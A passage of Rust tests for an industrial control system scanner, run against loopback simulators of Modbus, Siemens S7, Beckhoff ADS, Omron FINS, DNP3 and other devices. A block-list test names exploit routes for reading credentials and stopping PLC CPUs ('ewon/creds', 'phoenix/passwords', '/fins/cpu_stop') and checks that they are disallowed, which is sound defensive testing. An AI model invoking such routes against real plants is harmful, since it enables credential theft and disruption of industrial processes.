        assert!(protocol_supports_scan_port_override("iec104"));
        assert!(protocol_supports_scan_port_override("snmp"));
        assert!(protocol_supports_scan_port_override("mqtt"));
        assert!(protocol_supports_scan_port_override("opcua"));
        for protocol in ["all", ""] {
            assert!(
                !protocol_supports_scan_port_override(protocol),
                "{protocol} must not inherit a protocol-specific port override"
            );
        }
    }

    #[test]
    fn web_read_only_protocol_writes_are_rejected_by_the_server() {
        assert!(web_vendor_write_is_blocked("modbus"));
        assert!(web_vendor_write_is_blocked("schneider"));
        assert!(web_vendor_write_is_blocked("modicon"));
        assert!(web_vendor_write_is_blocked("siemens"));
        assert!(web_vendor_write_is_blocked("s7"));
        assert!(web_vendor_write_is_blocked("beckhoff"));
        assert!(web_vendor_write_is_blocked("ads"));
        assert!(web_vendor_write_is_blocked("enip"));
        assert!(web_vendor_write_is_blocked("rockwell"));
        assert!(web_vendor_write_is_blocked("ethernet_ip"));
        assert!(web_vendor_write_is_blocked("mitsubishi"));
        assert!(web_vendor_write_is_blocked("slmp"));
        assert!(web_vendor_write_is_blocked("omron"));
        assert!(web_vendor_write_is_blocked("fins"));
        assert!(web_vendor_write_is_blocked("phoenix"));
        assert!(web_vendor_write_is_blocked("webvisit"));
        for vendor in ["ewon", "iec104", "snmp", "mqtt", "bacnet", "dnp3", "opcua"] {
            assert!(
                web_vendor_write_is_blocked(vendor),
                "{vendor} must remain read-only"
            );
        }
        assert!(!web_exploit_is_allowed("mitsubishi/read_d"));
        assert!(!web_exploit_is_allowed("/slmp/read_m"));
        assert!(!web_exploit_is_allowed("omron/info"));
        assert!(!web_exploit_is_allowed("/fins/cpu_stop"));
        assert!(!web_exploit_is_allowed("phoenix/passwords"));
        assert!(!web_exploit_is_allowed("/webvisit/write"));
        assert!(!web_exploit_is_allowed("ewon/creds"));
        assert!(!web_exploit_is_allowed("rockwell/identity"));
    }

    #[test]
    fn phoenix_webvisit_port_is_separate_from_the_info_port() {
        let fields = json!({
            "port": 11962,
            "phoenix_info_port": 11962,
            "webvisit_port": 11980,
        });
        assert_eq!(phoenix_webvisit_port_from_fields(&fields), 11980);
        assert_eq!(
            phoenix_webvisit_port_from_fields(&json!({"http_port": "8080"})),
            8080
        );
        assert_eq!(
            phoenix_webvisit_port_from_fields(&json!({"port": 11962})),
            PHOENIX_WEBVISIT_PORT,
            "the ProConOS port must never become a WebVisit HTTP fallback"
        );
    }

    #[test]
    fn ewon_web_port_is_separate_from_ipconf_discovery_metadata() {
        let fields = json!({
            "ipconf_port": 17507,
            "ewon_web_port": 18080,
        });
        assert_eq!(
            ["ewon_web_port", "web_port", "http_port"]
                .iter()
                .find_map(|key| json_field_u16(&fields, key)),
            Some(18080)
        );
        assert_eq!(
            ["ewon_web_port", "web_port", "http_port"]
                .iter()
                .find_map(|key| json_field_u16(&json!({"ipconf_port": 17507}), key)),
            None,
            "the IPCONF UDP destination must never become an HTTP tag port"
        );
    }

    #[test]
    fn enip_vendor_classification_requires_a_confirmed_rockwell_identity() {
        assert_eq!(
            enip_web_vendor("Rockwell Automation / Allen-Bradley"),
            ("rockwell", Some(1))
        );
        assert_eq!(enip_web_vendor("Omron Corporation"), ("enip", None));
        assert_eq!(enip_web_vendor("Unknown (999)"), ("enip", None));
    }

    #[test]
    #[ignore = "requires the local Python Modbus simulator on the high-port lab profile"]
    fn modbus_web_scan_discovers_the_high_port_simulator() -> anyhow::Result<()> {
        use std::{
            process::{Command, Stdio},
            thread,
            time::Duration,
        };

        let simulator_path = concat!(env!("CARGO_MANIFEST_DIR"), "/sim/modbus_sim.py");
        let _simulator = SimulatorGuard(
            Command::new("python")
                .args([
                    "-u",
                    simulator_path,
                    "--host",
                    TEST_LOOPBACK_IP,
                    "--port",
                    "1502",
                ])
                .stdout(Stdio::null())
                .stderr(Stdio::null())
                .spawn()?,
        );

        // The simulator is deliberately kept outside the normal unit suite; wait
        // only for its loopback listener and make no write/control requests.
        thread::sleep(Duration::from_millis(250));
        let outcome = (|| -> anyhow::Result<()> {
            let devices = broadcast_scan_on_interface(
                "modbus",
                1,
                &test_loopback_interface(),
                TEST_LOOPBACK_CIDR,
                Some(1502),
                None,
                None,
                None,
            )?;
            let device = devices
                .iter()
                .find(|device| device["vendor"] == "modbus")
                .ok_or_else(|| anyhow::anyhow!("high-port Modbus simulator was not discovered"))?;
            assert_eq!(device["ip"], TEST_LOOPBACK_IP);
            assert_eq!(device["port"], 1502);
            assert_eq!(device["modbus_port"], 1502);
            assert_eq!(device["protocol"], "modbus_tcp");
            Ok(())
        })();
        outcome
    }

    #[test]
    #[ignore = "requires the local Python Modbus simulator on the high-port lab profile"]
    fn schneider_web_scan_confirms_the_high_port_simulator_identity() -> anyhow::Result<()> {
        use std::{
            process::{Command, Stdio},
            thread,
            time::Duration,
        };

        let simulator_path = concat!(env!("CARGO_MANIFEST_DIR"), "/sim/modbus_sim.py");
        let _simulator = SimulatorGuard(
            Command::new("python")
                .args([
                    "-u",
                    simulator_path,
                    "--host",
                    TEST_LOOPBACK_IP,
                    "--port",
                    "1502",
                    "--identity",
                    "schneider",
                ])
                .stdout(Stdio::null())
                .stderr(Stdio::null())
                .spawn()?,
        );

        // Only FC43 device identification and read-only Modbus TCP probe
        // traffic is sent to this loopback simulator.
        thread::sleep(Duration::from_millis(250));
        let outcome = (|| -> anyhow::Result<()> {
            let devices = broadcast_scan_on_interface(
                "schneider",
                1,
                &test_loopback_interface(),
                TEST_LOOPBACK_CIDR,
                Some(1502),
                None,
                None,
                None,
            )?;
            let device = devices
                .iter()
                .find(|device| device["vendor"] == "schneider")
                .ok_or_else(|| {
                    anyhow::anyhow!("high-port Schneider simulator was not discovered")
                })?;
            assert_eq!(device["ip"], TEST_LOOPBACK_IP);
            assert_eq!(device["port"], 1502);
            assert_eq!(device["modbus_port"], 1502);
            assert_eq!(device["discovery_transport"], "tcp");
            assert_eq!(device["identity_match"], true);
            assert_eq!(device["identity_status"], "confirmed");
            Ok(())
        })();
        outcome
    }

    #[test]
    #[ignore = "requires the local Python Siemens simulator on the high-port lab profile"]
    fn siemens_web_scan_discovers_the_high_port_simulator() -> anyhow::Result<()> {
        use std::{
            process::{Command, Stdio},
            thread,
            time::Duration,
        };

        let simulator_path = concat!(env!("CARGO_MANIFEST_DIR"), "/sim/siemens_sim.py");
        let _simulator = SimulatorGuard(
            Command::new("python")
                .args([
                    "-u",
                    simulator_path,
                    "--host",
                    TEST_LOOPBACK_IP,
                    "--port",
                    "1102",
                ])
                .stdout(Stdio::null())
                .stderr(Stdio::null())
                .spawn()?,
        );

        // The scanner performs only COTP/S7Comm setup plus SZL identity/state
        // reads against this loopback stub. It never requests CPU control.
        thread::sleep(Duration::from_millis(250));
        let outcome = (|| -> anyhow::Result<()> {
            let devices = broadcast_scan_on_interface(
                "siemens",
                1,
                &test_loopback_interface(),
                TEST_LOOPBACK_CIDR,
                Some(1102),
                None,
                None,
                None,
            )?;
            let device = devices
                .iter()
                .find(|device| device["vendor"] == "siemens")
                .ok_or_else(|| anyhow::anyhow!("high-port Siemens simulator was not discovered"))?;
            assert_eq!(device["ip"], TEST_LOOPBACK_IP);
            assert_eq!(device["protocol"], "s7comm");
            assert_eq!(device["port"], 1102);
            assert_eq!(device["s7_port"], 1102);
            assert_eq!(device["hardware"], "6ES7 315-2EH14-0AB0");
            assert_eq!(device["firmware"], "V3.2");
            assert_eq!(device["cpu_state"], "Running");
            Ok(())
        })();
        outcome
    }

    #[test]
    #[ignore = "requires the local Python Beckhoff ADS simulator on the high-port lab profile"]
    fn beckhoff_web_scan_confirms_the_high_port_ads_simulator() -> anyhow::Result<()> {
        use std::{
            process::{Command, Stdio},
            thread,
            time::Duration,
        };

        let simulator_path = concat!(env!("CARGO_MANIFEST_DIR"), "/sim/beckhoff_sim.py");
        let _simulator = SimulatorGuard(
            Command::new("python")
                .args([
                    "-u",
                    simulator_path,
                    "--host",
                    TEST_LOOPBACK_IP,
                    "--ads-port",
                    "14898",
                    "--discovery-port",
                    "48899",
                ])
                .stdout(Stdio::null())
                .stderr(Stdio::null())
                .spawn()?,
        );

        // The web scan first uses only the standard discovery request, then a
        // read-only ADS ReadState at the explicitly selected high port.  No
        // state change, symbol write, route action, or control request is sent.
        thread::sleep(Duration::from_millis(250));
        let outcome = (|| -> anyhow::Result<()> {
            use casket::vendors::beckhoff::{ads, scan};

            let direct = scan::discover_ip_with_port(TEST_LOOPBACK_IP, 1, true, 14898)?;
            let device = direct
                .first()
                .ok_or_else(|| anyhow::anyhow!("ADS simulator did not answer discovery"))?;
            assert_eq!(
                scan::get_state(device, &ads::build_local_netid(TEST_LOOPBACK_IP), 14898),
                "RUN",
                "the high ADS port must answer the read-only state query"
            );

            let devices = broadcast_scan_on_interface(
                "beckhoff",
                1,
                &test_loopback_interface(),
                TEST_LOOPBACK_CIDR,
                Some(14898),
                None,
                None,
                None,
            )?;
            let device = devices
                .iter()
                .find(|device| device["vendor"] == "beckhoff")
                .ok_or_else(|| {
                    anyhow::anyhow!("high-port Beckhoff simulator was not discovered")
                })?;
            assert_eq!(device["ip"], TEST_LOOPBACK_IP);
            assert_eq!(device["protocol"], "ads_tcp");
            assert_eq!(device["port"], 14898);
            assert_eq!(device["ads_port"], 14898);
            assert_eq!(device["ads_state"], "RUN");
            assert_eq!(device["discovery_transport"], "udp+ads_tcp");
            Ok(())
        })();
        outcome
    }

    #[test]
    #[ignore = "requires the local Python EtherNet/IP simulator on the high-port lab profile"]
    fn enip_web_scan_confirms_the_high_port_rockwell_identity() -> anyhow::Result<()> {
        use std::{
            process::{Command, Stdio},
            thread,
            time::Duration,
        };

        let simulator_path = concat!(env!("CARGO_MANIFEST_DIR"), "/sim/eip_sim.py");
        let _simulator = SimulatorGuard(
            Command::new("python")
                .args([
                    "-u",
                    simulator_path,
                    "--host",
                    TEST_LOOPBACK_IP,
                    "--port",
                    "14818",
                    // The explicit-port web scan is TCP-only; use a separate high
                    // UDP port so this test cannot collide with a real/default
                    // EtherNet/IP discovery listener.
                    "--udp-port",
                    "14819",
                ])
                .stdout(Stdio::null())
                .stderr(Stdio::null())
                .spawn()?,
        );

        thread::sleep(Duration::from_millis(250));
        let outcome = (|| -> anyhow::Result<()> {
            let devices = broadcast_scan_on_interface(
                "enip",
                1,
                &test_loopback_interface(),
                TEST_LOOPBACK_CIDR,
                Some(14818),
                None,
                None,
                None,
            )?;
            let device = devices
                .iter()
                .find(|device| device["vendor"] == "rockwell")
                .ok_or_else(|| {
                    anyhow::anyhow!("high-port EtherNet/IP simulator was not discovered")
                })?;
            assert_eq!(device["ip"], TEST_LOOPBACK_IP);
            assert_eq!(device["protocol"], "ethernet_ip");
            assert_eq!(device["port"], 14818);
            assert_eq!(device["enip_port"], 14818);
            assert_eq!(device["vendor_id"], 1);
            assert_eq!(
                device["identity_vendor"],
                "Rockwell Automation / Allen-Bradley"
            );
            assert_eq!(device["discovery_transport"], "tcp_identity");
            Ok(())
        })();
        outcome
    }

    #[test]
    #[ignore = "requires the local Python Mitsubishi SLMP simulator on the high-port lab profile"]
    fn mitsubishi_web_scan_discovers_the_high_port_slmp_simulator() -> anyhow::Result<()> {
        use std::{
            process::{Command, Stdio},
            thread,
            time::Duration,
        };

        let simulator_path = concat!(env!("CARGO_MANIFEST_DIR"), "/sim/slmp_sim.py");
        let _simulator = SimulatorGuard(
            Command::new("python")
                .args([
                    "-u",
                    simulator_path,
                    "--host",
                    TEST_LOOPBACK_IP,
                    "--port",
                    "15007",
                ])
                .stdout(Stdio::null())
                .stderr(Stdio::null())
                .spawn()?,
        );

        // The selected-port path performs only the SLMP D0 batch-read probe.
        // It never calls the simulator's write handler or UDP discovery code.
        thread::sleep(Duration::from_millis(250));
        let outcome = (|| -> anyhow::Result<()> {
            let devices = broadcast_scan_on_interface(
                "mitsubishi",
                1,
                &test_loopback_interface(),
                TEST_LOOPBACK_CIDR,
                Some(15007),
                None,
                None,
                None,
            )?;
            let device = devices
                .iter()
                .find(|device| device["vendor"] == "mitsubishi")
                .ok_or_else(|| {
                    anyhow::anyhow!("high-port Mitsubishi SLMP simulator was not discovered")
                })?;
            assert_eq!(device["ip"], TEST_LOOPBACK_IP);
            assert_eq!(device["protocol"], "slmp_tcp");
            assert_eq!(device["port"], 15007);
            assert_eq!(device["slmp_port"], 15007);
            assert_eq!(device["discovery_transport"], "tcp");
            assert_eq!(device["scan_scope"], TEST_LOOPBACK_CIDR);
            Ok(())
        })();
        outcome
    }

    #[test]
    #[ignore = "requires the local Python Omron FINS simulator on the high-port lab profile"]
    fn omron_web_scan_discovers_the_high_port_fins_simulator() -> anyhow::Result<()> {
        use std::{
            process::{Command, Stdio},
            thread,
            time::Duration,
        };

        let simulator_path = concat!(env!("CARGO_MANIFEST_DIR"), "/sim/fins_sim.py");
        let _simulator = SimulatorGuard(
            Command::new("python")
                .args([
                    "-u",
                    simulator_path,
                    "--host",
                    TEST_LOOPBACK_IP,
                    "--port",
                    "19600",
                ])
                .stdout(Stdio::null())
                .stderr(Stdio::null())
                .spawn()?,
        );

        // This test sends only FINS/TCP negotiation plus Controller Data Read
        // (05 01) for discovery. The final DM read validates the stored
        // high-port endpoint used by the live Tags view; it performs no write
        // or CPU control request.
        thread::sleep(Duration::from_millis(250));
        let outcome = (|| -> anyhow::Result<()> {
            let devices = broadcast_scan_on_interface(
                "omron",
                1,
                &test_loopback_interface(),
                TEST_LOOPBACK_CIDR,
                Some(19600),
                None,
                None,
                None,
            )?;
            let device = devices
                .iter()
                .find(|device| device["vendor"] == "omron")
                .ok_or_else(|| {
                    anyhow::anyhow!("high-port Omron FINS simulator was not discovered")
                })?;
            assert_eq!(device["ip"], TEST_LOOPBACK_IP);
            assert_eq!(device["protocol"], "fins_tcp");
            assert_eq!(device["port"], 19600);
            assert_eq!(device["fins_port"], 19600);
            assert_eq!(device["node"], 1);
            assert_eq!(device["model"], "CP1E");
            assert_eq!(device["version"], "V1.0");
            assert_eq!(device["discovery_transport"], "tcp_identity");

            let port = u16::try_from(device["fins_port"].as_u64().unwrap_or_default())?;
            let words =
                casket::vendors::omron::fins::read_dm_words(TEST_LOOPBACK_IP, port, 0, 0, 10)?;
            assert_eq!(words, vec![0; 10]);
            Ok(())
        })();
        outcome
    }

    #[test]
    #[ignore = "requires the local Python Phoenix simulator on the high-port lab profile"]
    fn phoenix_web_scan_discovers_the_high_port_simulator_and_reuses_webvisit_port(
    ) -> anyhow::Result<()> {
        use std::{
            process::{Command, Stdio},
            thread,
            time::Duration,
        };

        let simulator_path = concat!(env!("CARGO_MANIFEST_DIR"), "/sim/phoenix_sim.py");
        let _simulator = SimulatorGuard(
            Command::new("python")
                .args([
                    "-u",
                    simulator_path,
                    "--host",
                    TEST_LOOPBACK_IP,
                    "--port",
                    "11962",
                    "--http-port",
                    "11980",
                ])
                .stdout(Stdio::null())
                .stderr(Stdio::null())
                .spawn()?,
        );

        // The selected-port scan sends only the ProConOS device-info handshake.
        // The subsequent WebVisit requests are only GET /, GET .tcr, and the
        // ILRReadValues read endpoint; no write, control, or credential request.
        thread::sleep(Duration::from_millis(250));
        let outcome = (|| -> anyhow::Result<()> {
            let devices = broadcast_scan_on_interface(
                "phoenix",
                1,
                &test_loopback_interface(),
                TEST_LOOPBACK_CIDR,
                Some(11962),
                Some(11980),
                None,
                None,
            )?;
            let device = devices
                .iter()
                .find(|device| device["vendor"] == "phoenix")
                .ok_or_else(|| anyhow::anyhow!("high-port Phoenix simulator was not discovered"))?;
            assert_eq!(device["ip"], TEST_LOOPBACK_IP);
            assert_eq!(device["protocol"], "proconos_tcp");
            assert_eq!(device["port"], 11962);
            assert_eq!(device["phoenix_info_port"], 11962);
            assert_eq!(device["webvisit_port"], 11980);
            assert_eq!(device["discovery_transport"], "tcp_identity");

            let webvisit_port = phoenix_webvisit_port_from_fields(device);
            let (_, tag_names) =
                casket::vendors::phoenix::webvisit::get_tags(TEST_LOOPBACK_IP, webvisit_port)?;
            let values = casket::vendors::phoenix::webvisit::read_tag_values(
                TEST_LOOPBACK_IP,
                webvisit_port,
                &tag_names,
            )?;
            assert!(values
                .iter()
                .any(|(name, value)| name == "PUMP_RUN" && value == "1"));
            Ok(())
        })();
        outcome
    }

    #[test]
    #[ignore = "requires the local Python eWON simulator on an isolated high-port profile"]
    fn ewon_web_scan_discovers_ipconf_and_reuses_the_saved_web_port() -> anyhow::Result<()> {
        use std::{
            process::{Command, Stdio},
            thread,
            time::Duration,
        };

        let simulator_path = concat!(env!("CARGO_MANIFEST_DIR"), "/sim/ewon_sim.py");
        let _simulator = SimulatorGuard(
            Command::new("python")
                .args([
                    "-u",
                    simulator_path,
                    "--host",
                    TEST_LOOPBACK_IP,
                    "--port",
                    "18080",
                    "--udp-port",
                    "17507",
                ])
                .stdout(Stdio::null())
                .stderr(Stdio::null())
                .spawn()?,
        );

        thread::sleep(Duration::from_millis(250));
        let outcome = (|| -> anyhow::Result<()> {
            let devices = broadcast_scan_on_interface(
                "ewon",
                1,
                &test_loopback_interface(),
                TEST_LOOPBACK_CIDR,
                Some(17507),
                None,
                Some(18080),
                None,
            )?;
            let device = devices
                .iter()
                .find(|device| device["vendor"] == "ewon")
                .ok_or_else(|| anyhow::anyhow!("high-port eWON simulator was not discovered"))?;
            assert_eq!(device["ip"], TEST_LOOPBACK_IP);
            assert_eq!(device["ipconf_port"], 17507);
            assert_eq!(device["ewon_web_port"], 18080);
            assert_eq!(device["discovery_transport"], "udp_ipconf_unicast");

            let tags = casket::vendors::ewon::scan::read_tag_values(TEST_LOOPBACK_IP, 18080, None)?;
            assert!(tags
                .iter()
                .any(|(name, value)| name == "PUMP_RUN" && value == "true"));
            Ok(())
        })();
        outcome
    }

    #[test]
    #[ignore = "requires the local Python IEC-104 simulator on an isolated high port"]
    fn iec104_web_scan_discovers_the_high_port_simulator() -> anyhow::Result<()> {
        use std::{
            process::{Command, Stdio},
            thread,
            time::Duration,
        };

        let simulator_path = concat!(env!("CARGO_MANIFEST_DIR"), "/sim/iec104_sim.py");
        let _simulator = SimulatorGuard(
            Command::new("python")
                .args([
                    "-u",
                    simulator_path,
                    "--host",
                    TEST_LOOPBACK_IP,
                    "--port",
                    "22404",
                ])
                .stdout(Stdio::null())
                .stderr(Stdio::null())
                .spawn()?,
        );

        thread::sleep(Duration::from_millis(250));
        let outcome = (|| -> anyhow::Result<()> {
            let devices = broadcast_scan_on_interface(
                "iec104",
                1,
                &test_loopback_interface(),
                TEST_LOOPBACK_CIDR,
                Some(22404),
                None,
                None,
                None,
            )?;
            let device = devices
                .iter()
                .find(|device| device["vendor"] == "iec104")
                .ok_or_else(|| anyhow::anyhow!("high-port IEC-104 simulator was not discovered"))?;
            assert_eq!(device["ip"], TEST_LOOPBACK_IP);
            assert_eq!(device["vendor"], "iec104");
            assert_eq!(device["protocol"], "iec60870_5_104");
            assert_eq!(device["iec104_port"], 22404);
            assert_eq!(device["discovery_transport"], "tcp_testfr");

            let mut session = casket::vendors::iec104::client::connect(TEST_LOOPBACK_IP, 22404)?;
            let objects = casket::vendors::iec104::client::general_interrogation(&mut session)?;
            assert!(
                !objects.is_empty(),
                "the simulator returns at least one GI object"
            );
            Ok(())
        })();
        outcome
    }

    #[test]
    #[ignore = "requires the local Python SNMP simulator on an isolated high port"]
    fn snmp_web_scan_uses_only_the_supplied_community_and_port() -> anyhow::Result<()> {
        use std::{
            process::{Command, Stdio},
            thread,
            time::Duration,
        };

        let simulator_path = concat!(env!("CARGO_MANIFEST_DIR"), "/sim/snmp_sim.py");
        let _simulator = SimulatorGuard(
            Command::new("python")
                .args([
                    "-u",
                    simulator_path,
                    "--host",
                    TEST_LOOPBACK_IP,
                    "--port",
                    "2161",
                ])
                .stdout(Stdio::null())
                .stderr(Stdio::null())
                .spawn()?,
        );

        thread::sleep(Duration::from_millis(250));
        let devices = broadcast_scan_on_interface(
            "snmp",
            1,
            &test_loopback_interface(),
            TEST_LOOPBACK_CIDR,
            Some(2161),
            None,
            None,
            Some("public"),
        )?;
        let device = devices
            .iter()
            .find(|device| device["vendor"] == "snmp")
            .ok_or_else(|| anyhow::anyhow!("high-port SNMP simulator was not discovered"))?;
        assert_eq!(device["ip"], TEST_LOOPBACK_IP);
        assert_eq!(device["vendor"], "snmp");
        assert_eq!(device["protocol"], "snmp_v2c");
        assert_eq!(device["snmp_port"], 2161);
        assert_eq!(device["community"], "public");
        assert_eq!(device["sys_descr"], "SCALANCE X200 simulated");
        assert_eq!(device["discovery_transport"], "udp_get");
        Ok(())
    }

    #[test]
    #[ignore = "requires the local Python MQTT simulator (amqtt) on an isolated high port"]
    fn mqtt_web_scan_discovers_the_high_port_broker() -> anyhow::Result<()> {
        use std::{
            process::{Command, Stdio},
            thread,
            time::Duration,
        };

        let simulator_path = concat!(env!("CARGO_MANIFEST_DIR"), "/sim/mqtt_sim.py");
        let _simulator = SimulatorGuard(
            Command::new("python")
                .args([
                    "-u",
                    simulator_path,
                    "--host",
                    TEST_LOOPBACK_IP,
                    "--port",
                    "21883",
                ])
                .stdout(Stdio::null())
                .stderr(Stdio::null())
                .spawn()?,
        );

        thread::sleep(Duration::from_millis(500));
        let devices = broadcast_scan_on_interface(
            "mqtt",
            2,
            &test_loopback_interface(),
            TEST_LOOPBACK_CIDR,
            Some(21883),
            None,
            None,
            None,
        )?;
        let device = devices
            .iter()
            .find(|d| d["vendor"] == "mqtt")
            .ok_or_else(|| anyhow::anyhow!("high-port MQTT broker was not discovered"))?;
        assert_eq!(device["ip"], TEST_LOOPBACK_IP);
        assert_eq!(device["vendor"], "mqtt");
        assert_eq!(device["protocol"], "mqtt_3_1_1");
        assert_eq!(device["mqtt_port"], 21883);
        assert_eq!(device["anonymous"], true);
        assert_eq!(device["discovery_transport"], "tcp_connect");
        Ok(())
    }

    #[test]
    #[ignore = "requires the local Python OPC-UA simulator (asyncua) on an isolated high port"]
    fn opcua_web_scan_discovers_the_high_port_server() -> anyhow::Result<()> {
        use std::{
            process::{Command, Stdio},
            thread,
            time::Duration,
        };

        let simulator_path = concat!(env!("CARGO_MANIFEST_DIR"), "/sim/opcua_sim.py");
        let _simulator = SimulatorGuard(
            Command::new("python")
                .args([
                    "-u",
                    simulator_path,
                    "--host",
                    TEST_LOOPBACK_IP,
                    "--port",
                    "44840",
                ])
                .stdout(Stdio::null())
                .stderr(Stdio::null())
                .spawn()?,
        );

        thread::sleep(Duration::from_secs(1));
        let devices = broadcast_scan_on_interface(
            "opcua",
            3,
            &test_loopback_interface(),
            TEST_LOOPBACK_CIDR,
            Some(44840),
            None,
            None,
            None,
        )?;
        let device = devices
            .iter()
            .find(|d| d["vendor"] == "opcua")
            .ok_or_else(|| anyhow::anyhow!("high-port OPC-UA server was not discovered"))?;
        assert_eq!(device["ip"], TEST_LOOPBACK_IP);
        assert_eq!(device["vendor"], "opcua");
        assert_eq!(device["protocol"], "opc_ua_tcp");
        assert_eq!(device["opcua_port"], 44840);
        assert_eq!(device["discovery_transport"], "tcp_hello_ack");
        assert!(
            device["endpoint_count"].is_number(),
            "endpoint_count must be a numeric field"
        );
        Ok(())
    }

    #[test]
    #[ignore = "requires the local Python BACnet/IP simulator on an isolated high UDP port"]
    fn bacnet_web_scan_discovers_the_high_port_device() -> anyhow::Result<()> {
        use std::{
            process::{Command, Stdio},
            thread,
            time::Duration,
        };

        let simulator_path = concat!(env!("CARGO_MANIFEST_DIR"), "/scripts/sim_bacnet.py");
        let _simulator = SimulatorGuard(
            Command::new("python")
                .args([
                    "-u",
                    simulator_path,
                    "--host",
                    TEST_LOOPBACK_IP,
                    "--port",
                    "34780",
                ])
                .stdout(Stdio::null())
                .stderr(Stdio::null())
                .spawn()?,
        );

        thread::sleep(Duration::from_millis(250));
        let devices = broadcast_scan_on_interface(
            "bacnet",
            2,
            &test_loopback_interface(),
            TEST_LOOPBACK_CIDR,
            Some(34780),
            None,
            None,
            None,
        )?;
        let device = devices
            .iter()
            .find(|device| device["vendor"] == "bacnet")
            .ok_or_else(|| anyhow::anyhow!("high-port BACnet/IP device was not discovered"))?;
        assert_eq!(device["ip"], TEST_LOOPBACK_IP);
        assert_eq!(device["bacnet_port"], 34780);
        assert_eq!(device["object_name"], "ScadaverCI");
        assert_eq!(device["discovery_transport"], "udp_unicast_who_is");
        Ok(())
    }

    #[test]
    #[ignore = "requires the local Python DNP3 simulator on an isolated high port"]
    fn dnp3_web_scan_discovers_the_high_port_outstation() -> anyhow::Result<()> {
        use std::{
            process::{Command, Stdio},
            thread,
            time::Duration,
        };

        let simulator_path = concat!(env!("CARGO_MANIFEST_DIR"), "/sim/dnp3_sim.py");
        let _simulator = SimulatorGuard(
            Command::new("python")
                .args([
                    "-u",
                    simulator_path,
                    "--host",
                    TEST_LOOPBACK_IP,
                    "--port",
                    "33001",
                ])
                .stdout(Stdio::null())
                .stderr(Stdio::null())
                .spawn()?,
        );

        thread::sleep(Duration::from_millis(500));
        let devices = broadcast_scan_on_interface(
            "dnp3",
            2,
            &test_loopback_interface(),
            TEST_LOOPBACK_CIDR,
            Some(33001),
            None,
            None,
            None,
        )?;
        let device = devices
            .iter()
            .find(|device| device["vendor"] == "dnp3")
            .ok_or_else(|| anyhow::anyhow!("DNP3 outstation did not respond on port 33001"))?;
        assert_eq!(device["ip"], TEST_LOOPBACK_IP);
        assert_eq!(device["dnp3_port"], 33001);
        assert_eq!(device["discovery_transport"], "tcp_link_status");
        Ok(())
    }

    #[test]
    fn scan_request_accepts_protocol_as_the_public_vendor_alias() {
        let request: ScanNetworkReq = serde_json::from_value(json!({
            "protocol": "modbus",
            "iface_ip": TEST_LOOPBACK_IP,
            "target_cidr": TEST_LOOPBACK_CIDR,
            "target_port": 1502,
            "webvisit_port": 8080,
        }))
        .unwrap();
        assert_eq!(request.vendor, "modbus");
        assert_eq!(request.target_port, Some(1502));
        assert_eq!(request.webvisit_port, Some(8080));
    }

    #[test]
    fn interface_network_uses_the_reported_netmask() {
        assert_eq!(
            interface_network_cidr("10.2.10.25", "255.255.255.0").unwrap(),
            "10.2.10.0/24"
        );
        assert_eq!(
            interface_network_cidr("172.16.22.9", "255.255.252.0").unwrap(),
            "172.16.20.0/22"
        );
    }

    #[test]
    fn modbus_sweep_is_limited_and_uses_the_selected_interface_network() {
        let iface = casket::core::network::NetworkInterface {
            name: "lab".to_string(),
            ip: "10.2.10.25".to_string(),
            netmask: "255.255.255.0".to_string(),
        };
        let (scope, hosts) = modbus_sweep_hosts("", &iface).unwrap();
        assert_eq!(scope, "10.2.10.0/24");
        assert_eq!(hosts.len(), 254);
        assert_eq!(hosts.first().map(String::as_str), Some("10.2.10.1"));
        assert_eq!(hosts.last().map(String::as_str), Some("10.2.10.254"));
        assert!(modbus_sweep_hosts("10.0.0.0/8", &iface).is_err());
    }

    #[test]
    fn single_host_cidr_is_a_usable_sweep_target() {
        let iface = test_loopback_interface();
        let (scope, hosts) = protocol_sweep_hosts(TEST_LOOPBACK_CIDR, &iface).unwrap();
        assert_eq!(scope, TEST_LOOPBACK_CIDR);
        assert_eq!(hosts, vec![TEST_LOOPBACK_IP.to_string()]);
    }

    #[test]
    fn protocol_catalog_includes_every_core_probe_and_modbus_tcp() {
        let protocols = web_protocols();
        let slugs: Vec<_> = protocols
            .iter()
            .filter_map(|protocol| protocol["slug"].as_str())
            .collect();

        assert_eq!(slugs.len(), 15);
        for expected in [
            "beckhoff",
            "siemens",
            "enip",
            "ewon",
            "mitsubishi",
            "schneider",
            "phoenix",
            "omron",
            "iec104",
            "snmp",
            "mqtt",
            "bacnet",
            "dnp3",
            "opcua",
            "modbus",
        ] {
            assert!(
                slugs.contains(&expected),
                "{expected} is missing from the web catalog"
            );
        }
    }

    #[test]
    fn selected_interface_honors_the_exact_interface_ip() {
        let interfaces = vec![
            casket::core::network::NetworkInterface {
                name: "office".to_string(),
                ip: "192.168.1.20".to_string(),
                netmask: "255.255.255.0".to_string(),
            },
            casket::core::network::NetworkInterface {
                name: "ot-lab".to_string(),
                ip: "10.2.10.25".to_string(),
                netmask: "255.255.255.0".to_string(),
            },
        ];

        let selected = selected_interface(interfaces, "10.2.10.25").unwrap();
        assert_eq!(selected.name, "ot-lab");
        assert_eq!(selected.ip, "10.2.10.25");
    }

    #[test]
    fn protocol_subnet_sweeps_have_a_conservative_limit() {
        let iface = casket::core::network::NetworkInterface {
            name: "lab".to_string(),
            ip: "10.2.10.25".to_string(),
            netmask: "255.255.255.0".to_string(),
        };
        assert!(protocol_sweep_hosts("10.2.10.0/24", &iface).is_ok());
        assert!(protocol_sweep_hosts("10.2.10.0/23", &iface).is_err());
    }

    // ── parse_bool_value ───────────────────────────────────────────────────────

    #[test]
    fn parse_bool_false_values() {
        for s in &["false", "False", "FALSE", "0", "off", "OFF", "Off"] {
            assert!(!parse_bool_value(s), "{s} should be false");
        }
    }

    #[test]
    fn parse_bool_true_values() {
        for s in &["true", "1", "on", "yes", "anything", ""] {
            assert!(parse_bool_value(s), "{s} should be true");
        }
    }

    // ── parse_s7_bit_tag ───────────────────────────────────────────────────────

    #[test]
    fn parse_s7_bit_tag_valid_output() {
        assert_eq!(parse_s7_bit_tag("Q1.3"), Some(('Q', 1, 3)));
    }

    #[test]
    fn parse_s7_bit_tag_valid_merker() {
        assert_eq!(parse_s7_bit_tag("M0.0"), Some(('M', 0, 0)));
    }

    #[test]
    fn parse_s7_bit_tag_max_values() {
        assert_eq!(parse_s7_bit_tag("Q255.7"), Some(('Q', 255, 7)));
    }

    #[test]
    fn parse_s7_bit_tag_missing_dot_returns_none() {
        assert!(parse_s7_bit_tag("Q1").is_none());
    }

    #[test]
    fn parse_s7_bit_tag_empty_returns_none() {
        assert!(parse_s7_bit_tag("").is_none());
    }

    #[test]
    fn parse_s7_bit_tag_no_area_returns_none() {
